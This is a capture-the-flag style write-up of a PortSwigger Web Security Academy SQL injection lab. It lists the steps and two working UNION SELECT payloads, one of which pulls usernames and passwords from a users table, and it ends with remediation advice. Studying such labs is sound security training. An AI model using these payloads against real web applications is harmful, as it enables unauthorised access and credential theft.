# SQL Injection UNION Attack: Retrieving Multiple Values in a Single Column

* **Platform:** PortSwigger Web Security Academy
* **Difficulty:** Practitioner
* **Category:** SQL Injection — UNION Attacks
* **Status:** Solved
* **Tool:** Burp Suite

## Objective

Retrieve multiple values from the `users` table by exploiting a SQL injection vulnerability in the product category filter.

## Methodology

1. Intercepted the product category filter request using Burp Suite.
2. Determined that the query returned two columns and identified the text-compatible column.
3. Used a `UNION SELECT` payload to concatenate usernames and passwords into a single column.
4. Verified that the response contained the retrieved values.

## Payloads

**Identify the text-compatible column:**

```sql
'+UNION+SELECT+NULL,'abc'--
```

**Retrieve multiple values:**

```sql
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

## Vulnerability

The application incorporated untrusted input into an SQL query without adequate protection.

## Impact

An attacker could retrieve sensitive information from the database, including usernames and password values.

## Remediation

* Use parameterized queries.
* Avoid concatenating untrusted input into SQL statements.
* Apply least-privilege database permissions.
* Store passwords using strong, salted password hashes.
